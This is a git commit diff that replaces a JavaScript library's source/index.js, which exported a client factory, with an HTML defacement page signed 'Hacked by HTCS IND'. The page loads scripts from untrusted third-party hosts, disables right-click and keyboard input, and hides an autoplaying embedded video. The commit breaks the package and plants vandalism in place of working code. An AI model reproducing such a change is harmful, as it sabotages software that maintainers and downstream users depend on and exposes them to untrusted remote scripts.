61735f1158a62cb223da147e355ad5874839a38a
anonyday <34414201+anonyday@users.noreply.github.com>
2017-12-10 17:18:53 +0700

    Update index.js

--- source/index.js
+++ source/index.js
@@ -1,8 +1,48 @@
-"use strict";
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- ---------HTCS IND IS HERE---------- -->
+<html>
+<head>
+<title>Mr.MisDir3ction.X</title>
+<meta content='Hacked by HTCS IND' name='description'/>
+<meta content='Hacked by HTCS IND' name='keywords'/>
+<meta content='Hacked by HTCS IND' name='Abstract'/>
+<meta name="title" content="Who Am I ?">
+<meta name="description" content="^ I love You L.C :* ^">
+<meta name="googlebot" content="index,follow" />
+<meta name="robots" content="all" />
+<meta name="robots schedule" content="auto" />
+<meta name="distribution" content="global" />
+</style>
+<body bgcolor="#000" marginwidth="0" marginheight="0" style="background: black url(https://www.wallpaperflare.com/static/156/919/675/malham-cove-milky-way-pano-landscape-photography-wallpaper.jpg)
 
-const setFetchMethod = require("./request.js").setFetchMethod;
-const createClient = require("./factory.js").createClient;
+no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover;
 
-createClient.setFetchMethod = setFetchMethod;
+background-size:cover;" onload="type_text()" bottommargin="0" rightmargin="0" leftmargin="0" topmargin="0">
+<body bgcolor="white" oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+<center>
+<body>
+<script src='http://yourjavascript.com/1171704334/efek-salju-faisal.js' type='text/javascript'/>
+<script type='text/javascript'>var DADrightclicktheme = 'Dark';var DADrightclickimage = 'http://i1307.photobucket.com/albums/s599/Ndazrsullivan/disable_right_click_zps2c36bf0f.jpg';</script><script type='text/javascript' src="http://yondarkness.googlecode.com/files/AntiCopas.js"> </script>
+<center><br><br><br><br><br><br><br>
 
-module.exports = createClient;
+<link href='http://fonts.googleapis.com/css?family=Lobster' rel='stylesheet' type='text/css'>
+<center><br>
+<br><br><br><br><br><br><br/><font face="Amatic SC" size="30" color="white">NO SYSTEM IS SAFE</font><br>
+<br><font face="Amatic SC" size="3" color="white">&copy; HTCS IND 2017</font>
+
+<br><br><br><br><br><br><br><br><br><br><br><br>
+</style>
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+<font face="Iceland" size="4">
+<br><br><font face="Iceland" size="5"><marquee scrollamount="4" scrolldelay="50" width="80%">
+<font color="white" face="Italic" size="3"> - Thanks To All - [ ALLAH S.W.T ]-[ Guru-guru ]-[ Kedua Orang Tua ]-[ Hackers Team Cyber School INDONESIA ]-[ Mr.MisDir3ction.X ]-[ RutD0wn ]-[ Mr_NoBody.991 ]-[ Kamu Yang Terindah L.C :* ]
+</font></marquee></font></p>
+<center>
+
+<embed src="http://www.youtube.com/v/UtjFu8c_goE&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>
+
+</h1></font><div id="foter" class="foter">
+<script><link href='http://fonts.googleapis.com/css?family=Amatic SC' rel='stylesheet' type='text/css'>
+<embed src="https://www.youtube.com/v/UtjFu8c_goE&autoplay=1;autoplay=1&amp;loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1">
+</embed>
+</HTML>
